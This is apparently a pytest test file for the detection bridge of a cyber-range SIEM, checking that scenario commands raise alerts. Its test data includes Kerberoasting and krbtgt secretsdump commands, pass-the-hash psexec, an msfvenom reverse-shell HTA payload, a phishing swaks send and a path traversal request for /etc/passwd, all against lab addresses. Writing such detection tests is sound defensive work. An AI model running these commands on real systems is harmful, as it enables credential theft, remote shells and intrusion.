import pytest

from src.siem.command_bridge import create_command_siem_events, match_command_events


def test_sc02_nmap_command_emits_recon_event():
    matches = match_command_events("nmap -p 88,389,445 172.20.2.20", "SC-02")

    assert any(event["id"] == "sc02_recon_port_scan" for event in matches)


def test_sc02_incomplete_impacket_continuation_is_not_a_false_siem_positive():
    matches = match_command_events(
        "python3 /opt/impacket/examples/GetUserSPNs.py \\",
        "SC-02",
    )

    assert matches == []


def test_sc02_complete_kerberoast_command_emits_4769_event():
    matches = match_command_events(
        "GetUserSPNs.py -dc-ip 172.20.2.20 -request nexora.local/jsmith:Password123",
        "SC-02",
    )

    assert any(event["id"] == "sc02_kerberos_roasting" for event in matches)


@pytest.mark.parametrize(
    ("scenario_id", "command"),
    [
        ("SC-02", "nmap 172.20.2.20"),
        ("SC-02", "enum4linux -a 172.20.2.20"),
        ("SC-03", "nmap 172.20.3.10"),
        ("SC-03", "curl http://172.20.3.10:3333"),
        ("SC-03", "swaks --to victim@orion.example --from attacker --server 172.20.3.20"),
    ],
)
def test_smoke_commands_match_active_bridge_rules(scenario_id: str, command: str):
    matches = match_command_events(command, scenario_id)

    assert len(matches) >= 1


@pytest.mark.parametrize(
    ("cmd", "min_matches"),
    [
        ("nmap 172.20.2.20", 1),
        ("nmap -sV -p 88,389,445 172.20.2.20", 1),
        ("enum4linux -a 172.20.2.20", 1),
        ("smbclient -L //172.20.2.20 -N", 1),
        ("ldapsearch -x -H ldap://172.20.2.20 -b dc=nexora,dc=local", 1),
        ("GetUserSPNs.py -dc-ip 172.20.2.20 -request nexora.local/jsmith:Password123", 1),
        ("GetNPUsers.py -no-pass -usersfile users.txt -dc-ip 172.20.2.20 nexora.local/", 1),
        ("secretsdump.py -just-dc-user krbtgt nexora.local/admin:p@172.20.2.20", 1),
        ("psexec.py -hashes :ntlmhash nexora.local/admin@172.20.2.40", 1),
        ("bloodhound-python -u jsmith -p p -d nexora.local -c All", 1),
    ],
)
def test_sc02_bridge_reproduction_list(cmd, min_matches):
    matches = match_command_events(cmd, "SC-02")
    assert (
        len(matches) >= min_matches
    ), f"{cmd!r} produced {len(matches)} matches, expected >= {min_matches}"


@pytest.mark.parametrize(
    ("cmd", "min_matches"),
    [
        ("nmap 172.20.3.10", 1),
        ("curl http://172.20.3.10:3333/", 1),
        ("curl http://172.20.3.10/", 1),
        ("swaks --to victim@orion.example --from attacker@phish --server 172.20.3.20", 1),
        ("msfvenom -p windows/meterpreter/reverse_https LHOST=172.20.3.10 -f hta", 1),
    ],
)
def test_sc03_bridge_reproduction_list(cmd, min_matches):
    matches = match_command_events(cmd, "SC-03")
    assert (
        len(matches) >= min_matches
    ), f"{cmd!r} produced {len(matches)} matches, expected >= {min_matches}"


@pytest.mark.parametrize(
    ("command", "expected_count"),
    [
        ("curl -i 172.20.1.1:80", 1),
        ("whatweb 172.20.1.1:80", 1),
        ("dig 172.20.1.20", 1),
        ("whatweb 172.20.1.20", 1),
        ("nmap 172.20.1.20", 1),
        ("nikto 172.20.1.20", 1),
        ("nmap -sV -p 80,443 172.20.1.20", 2),
        ("curl http://172.20.1.20/", 1),
        ("curl http://172.20.1.20/backup/", 1),
        ("gobuster dir", 1),
        ("gobuster http://172.20.1.20/backup/", 1),
        ("curl 'http://172.20.1.20/records?file=../../../../etc/passwd'", 3),
    ],
)
def test_sc01_reproduction_commands_emit_expected_matches(command: str, expected_count: int):
    matches = match_command_events(command, "SC-01")

    assert len(matches) == expected_count


@pytest.mark.asyncio
async def test_create_command_siem_events_uses_live_kali_ip_and_educational_bridge(monkeypatch):
    captured = []

    class _FakeDb:
        def add(self, item):
            captured.append(item)

    async def _fake_get_kali_ip(_session_id: str) -> str:
        return "172.20.1.3"

    monkeypatch.setattr("src.siem.command_bridge.get_kali_ip_for_session", _fake_get_kali_ip)

    events = await create_command_siem_events(
        "nmap 172.20.1.20",
        "session-123",
        "SC-01",
        _FakeDb(),
    )

    assert len(events) == 1
    assert events[0]["source"] == "educational_bridge"
    assert events[0]["source_ip"] == "172.20.1.3"
    assert captured[0].source == "educational_bridge"
    assert captured[0].source_ip == "172.20.1.3"
